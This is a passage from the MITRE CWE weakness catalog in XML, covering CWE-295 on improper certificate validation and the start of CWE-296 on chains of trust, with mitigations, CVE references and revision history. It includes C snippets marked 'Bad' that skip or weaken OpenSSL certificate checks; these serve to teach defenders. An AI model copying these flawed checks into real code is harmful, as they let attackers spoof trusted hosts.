               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Modes_of_Introduction, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="295" Name="Improper Certificate Validation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not validate, or incorrectly validates, a certificate.</Description>
         <Extended_Description>When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The product might connect to a malicious host while believing it is a trusted host, or the product might be deceived into accepting spoofed data that appears to originate from a trusted host.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="322" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Authentication</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-121">
               <Intro_Text>This code checks the certificate of a connected peer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if ((cert = SSL_get_peer_certificate(ssl)) &amp;&amp; host)<xhtml:div style="margin-left:1em;">foo=SSL_get_verify_result(ssl);</xhtml:div>
                     <xhtml:br/>if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// certificate looks good, host can be trusted</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-122">
               <Intro_Text>The following OpenSSL code obtains a certificate and verifies it.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>cert = SSL_get_peer_certificate(ssl);<xhtml:br/>if (cert &amp;&amp; (SSL_get_verify_result(ssl)==X509_V_OK)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// do secret things</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Even though the "verify" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-123">
               <Intro_Text>The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer(certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>foo=SSL_get_verify_result(ssl);<xhtml:br/>if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>//do stuff</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-124">
               <Intro_Text>The following OpenSSL code ensures that there is a certificate before continuing execution.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// got a certificate, do secret things</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-125">
               <Intro_Text>The following OpenSSL code ensures that the host has a certificate.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// got certificate, host can be trusted</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//foo=SSL_get_verify_result(ssl);</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//if (X509_V_OK==foo) ...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-12496</Reference>
               <Description>A Go framework for robotics, drones, and IoT devices skips verification of root CA certificates by default.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-1266</Reference>
               <Description>chain: incorrect "goto" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple "goto fail" bug). CWE-705 (Incorrect Control Flow Scoping) -&gt; CWE-561 (Dead Code) -&gt; CWE-295 (Improper Certificate Validation) -&gt; CWE-393 (Return of Wrong Status Code) -&gt; CWE-300 (Channel Accessible by Non-Endpoint).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-1266</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22909</Reference>
               <Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4989</Reference>
               <Description>Verification function trusts certificate chains in which the last certificate is self-signed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4989</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5821</Reference>
               <Description>Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5821</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3046</Reference>
               <Description>Web browser does not check if any intermediate certificates are revoked.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3046</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-0199</Reference>
               <Description>Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-0199</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5810</Reference>
               <Description>Mobile banking application does not verify hostname, leading to financial loss.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3446</Reference>
               <Description>Cloud-support library written in Python uses incorrect regular expression when matching hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3446</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2408</Reference>
               <Description>Web browser does not correctly handle '\0' character (NUL) in Common Name, allowing spoofing of https sites.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2408</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2993</Reference>
               <Description>Smartphone device does not verify hostname, allowing spoofing of mail services.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2993</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5822</Reference>
               <Description>Application uses third-party library that does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5822</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5819</Reference>
               <Description>Cloud storage management application does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5819</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5817</Reference>
               <Description>Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1378</Reference>
               <Description>chain: incorrect calculation allows attackers to bypass certificate checks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1378</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3170</Reference>
               <Description>LDAP client accepts certificates even if they are not from a trusted CA.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3170</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0265</Reference>
               <Description>chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0265</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1229</Reference>
               <Description>chain: product checks if client is trusted when it intended to check if the server is trusted, allowing validation of signed code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1229</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0862</Reference>
               <Description>Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1358</Reference>
               <Description>chain: OS package manager does not check properly check the return value, allowing bypass using a revoked certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1358</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="475"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-243"/>
            <Reference External_Reference_ID="REF-244"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
                <Submission_Version>Draft 3</Submission_Version>
                <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Background_Details, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-12-28</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Converted from category to weakness class.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Background_Details, Modes_of_Introduction, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2013-02-21">Certificate Issues</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="296" Name="Improper Following of a Certificate's Chain of Trust" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.</Description>
         <Extended_Description>
            <xhtml:p>If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.</xhtml:p>
            <xhtml:p>In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.</xhtml:p>
            <xhtml:p>There are several ways in which the chain of trust might be broken, including but not limited to:</xhtml:p>
            <xhtml:ul>
              <xhtml:li>Any certificate in the chain is self-signed, unless it the root.</xhtml:li>
              <xhtml:li>Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.</xhtml:li>
              <xhtml:li>An intermediate, CA-signed certificate does not have the expected Basic Constraints or other important extensions.</xhtml:li>
              <xhtml:li>The root certificate has been compromised or authorized to the wrong party.</xhtml:li>
            </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="295" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</Note>
            </Introduction>
	    <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Exploitation of this flaw can lead to the trust of data that may have originated with a spoofed source.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Data, requests, or actions taken by the attacking entity can be carried out as a spoofed benign entity.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that proper certificate checking is included in the system design.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Understand, and properly implement all checks necessary to ensure the integrity of certificate trust integrity.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the full chain of trust.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-121">
               <Intro_Text>This code checks the certificate of a connected peer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if ((cert = SSL_get_peer_certificate(ssl)) &amp;&amp; host)<xhtml:div style="margin-left:1em;">foo=SSL_get_verify_result(ssl);</xhtml:div>
                     <xhtml:br/>if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// certificate looks good, host can be trusted</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
